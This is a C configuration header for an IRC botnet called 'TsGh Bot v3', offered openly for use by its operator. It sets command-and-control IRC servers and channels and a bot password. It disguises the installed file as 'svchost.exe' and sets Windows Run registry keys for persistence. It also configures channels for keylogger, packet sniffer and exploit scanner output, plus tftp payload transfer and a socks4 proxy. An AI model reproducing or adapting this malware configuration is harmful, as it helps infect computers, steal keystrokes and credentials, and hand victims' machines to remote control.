/////////////////////////////////////////
///                                   ///
///  TsGh By TsGh Sniper              ///
///                                   ///
/////////////////////////////////////////
/*
####################################################################################
#                                                                    _
#                                                                         _( (~\
#                  _ _                        /                          ( \> > \
#              -/~/ / ~\                     :;                \       _  > /(~\/
#             || | | /\ ;\                   |l      _____     |;     ( \/    > >
#---------.    _\\)\)\)/ ;;;                  `8o __-~     ~\   d|      \      //
# HELP *  |  ///(())(__/~;;\                  "88p;.  -. _\_;.oP        (_._/ /
# HELP *  | (((__   __ \\   \                  `>,% (\  (\./)8"         ;:'  i
#         | )))--`.'-- (( ;,8 \               ,;%%%:  ./V^^^V'          ;.   ;.
#I'M JUST | ((\   |   /)) .,88  `: ..,,;;;;,-::::::'_::\   ||\         ;[8:   ;
#STUPID   !  )|  ~-~  |(|(888; ..``'::::8888oooooo.  :\`^^^/,,~--._    |88::  |
#WHITEHAT.|_____-===- /|  \8;; ``:.      oo.8888888888:`((( o.ooo8888Oo;:;:'  |
#         |. |_~-___-~_|   `-\.   `        `o`88888888b` )) 888b88888P""'     ;
#PLEASE   | ; ~~~~;~~         "`--_`.       b`888888888;(.,"888b888"  ..::;-'
#DONT HURT|   ;      ;              ~"-....  b`8888888:::::.`8888. .:;;;''
#MEEEEEE! |      ;    ;                 `:::. `:::OOO:::::::.`OO' ;;;''
#         | :       ;                     `.      "``::::::''    .'
# HELP *  |    ;                           `.   \_              /
# HELP *  |  ;       ;                       +:   ~~--  `:'  -';
#_________!                                /\ `:         : .::/    .
#                ;                        / / ;;+_  :::. :..;;;  _//
#                                         \ \ ;;-   ::::::.:::; / /
#                                         /  \;;:        \ \;;;/ /
*/

unsigned short port = 6667;          // This is your first irc server port
unsigned short port2 = 6668;          // This is your second server port
unsigned short socks4port = 1080;   // This is the port you want a socks4 proxy on
unsigned short tftpport = 69;	     // LEAVE THIS AS 69 this is the bots tftp port
unsigned short httpport = 2001;	     // This is the port you want http server on
unsigned short rloginport = 513;     // LEAVE AS 513 - This is the rlogin port
BOOL topiccmd = TRUE;		     // This is to control your bot via topic (leave true)
BOOL rndfilename = FALSE;	     // Random Filename? (Not recomended)
BOOL AutoStart = TRUE;	             // Auto start bot? (Set to TRUE)

#ifndef NO_VNC 
char http[] = "tftp -i"; 
#endif

char prefix = '@';	             // This is the bot prefix that you will use b4 commands
int maxrand = 5;		     // This is how many numbers are in your bots nick
int nicktype = OSNICK;	     // These are the nick types (leave as is or use 1 from nicklist.h)
BOOL nickprefix = FALSE;	     // LEAVE AS IS! using random character with bot nicknames

#ifdef DEBUG_LOGGING
char logfile[]="c:\\debug.txt";
#endif

#ifndef NO_CRYPT // crypt info
// 

#else  // recommended info

char botid[] = "TsGh Bot v3";		    		// ur bot ID
char version[] = "TsGh Bot v3 By ~TsGh Sniper";      	// version name
char password[] = "TsGh";			// bot password
char server[] = "irc.TalkShitGetHit.net";		// ur Bot Server
char serverpass[] = "";					// Server password
char channel[] = "#TsGh";			// bot channel
char chanpass[] = "";				// channel key
char server2[] = "irc2.TalkShitGetHit.net";		// sec Server
char channel2[] = "#TsGh";			// sec Channel
char chanpass2[] = "";			// sec key
char filename[] = "svchost.exe";		// bot file name in victim P.C
char keylogfile[] = "system.log";			// keyloger file name
char valuename[] = "svchost.exe";		// registry key name of the bot
char nickconst[] = "[TsGh]-";				// Bot Prefix Nickname
char szLocalPayloadFile[]="msconfig.dat";	//  PayLoad File Name
char modeonconn[] = "-x+i";				// bot mode on connecting
char chanmode[] = "+sntp";				// channel mode if bot is op in #Channel
char exploitchan[] = "#TsGh";		// Scanner Info Channel
char keylogchan[] = "#TsGh";			// Keyloger Info Channel
char psniffchan[] = "#TsGh";			// Sniffer Info Channel

// if you don`t have a Host.Name leav it on *@*
// if have a Host.Name type it Ex: *YourHost.Net
char *authost[] = {
	"TsGh_Sniper@TalkShitGetHit.net",		// Your Host Name
};

char *versionlist[] = {
	"TsGh Bot v1 Beta",
	"TsGh Bot v1",
	"TsGh Bot v2",
};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif

#ifdef PLAIN_CRYPT
char key[16] = "TsGhTsGhTsGhTsGh"; // CHANGE THIS!!! hmmm..Do I even need this now?
#endif
